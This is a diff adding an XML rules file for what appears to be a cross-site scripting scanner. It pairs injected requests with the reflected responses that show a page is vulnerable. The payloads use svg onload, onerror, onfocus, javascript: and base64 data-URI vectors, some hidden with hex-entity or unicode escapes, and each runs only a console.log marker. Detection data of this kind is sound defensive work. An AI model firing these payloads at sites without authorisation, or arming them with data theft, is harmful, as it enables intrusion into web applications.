@@ -1,0 +1,35 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rules>
+    <couple id="1">
+        <requests>
+            '"&gt;&lt;svg/onload=console.log(1234567890)&gt;//
+        </requests>
+        <responses>
+            &lt;svg/onload=console.log(1234567890)&gt;
+        </responses>
+    </couple>
+    <couple id="2">
+        <requests>
+            '"&gt;&lt;isindex type=image src=x onerror=console.log(1234567890)&gt;//
+            '"&gt;&lt;select autofocus onfocus==console.log(1234567890)&gt;//
+            '"&gt;&lt;embed src="javascript:console.log(1234567890)"&gt;//
+            '"&gt;&lt;object data="data:text/html;base64,PHNjcmlwdD5jb25zb2xlLmxvZygxMjM0NTY3ODkwKTs8L3NjcmlwdD4="&gt;//
+            &lt;script&gt;&#x63;&#x6f;&#x6e;&#x73;&#x6f;&#x6c;&#x65;&#x2e;&#x6c;&#x6f;&#x67;&#x28;&#x31;&#x32;&#x33;&#x34;&#x35;&#x36;&#x37;&#x38;&#x39;&#x30;&#x29;&#x3b;&lt;/script&gt;//
+        </requests>
+        <responses>
+            &lt;isindex type=image src=x onerror=console.log(1234567890)&gt;
+            &lt;select autofocus onfocus==console.log(1234567890)&gt;
+            &lt;embed src="javascript:console.log(1234567890)"&gt;
+            &lt;object data="data:text/html;base64,PHNjcmlwdD5jb25zb2xlLmxvZygxMjM0NTY3ODkwKTs8L3NjcmlwdD4="&gt;
+            &lt;script&gt;console.log(1234567890);&lt;/script&gt;
+        </responses>
+    </couple>
+    <couple id="3">
+        <requests>
+            \u003c\u0073\u0076\u0067\u002f\u006f\u006e\u006c\u006f\u0061\u0064\u003d\u0063\u006f\u006e\u0073\u006f\u006c\u0065\u002e\u006c\u006f\u0067\u0028\u0031\u0032\u0033\u0034\u0035\u0036\u0037\u0038\u0039\u0030\u0029\u003e
+        </requests>
+        <responses>
+            &lt;svg/onload=console.log(1234567890)&gt;
+        </responses>
+    </couple>
+</rules>
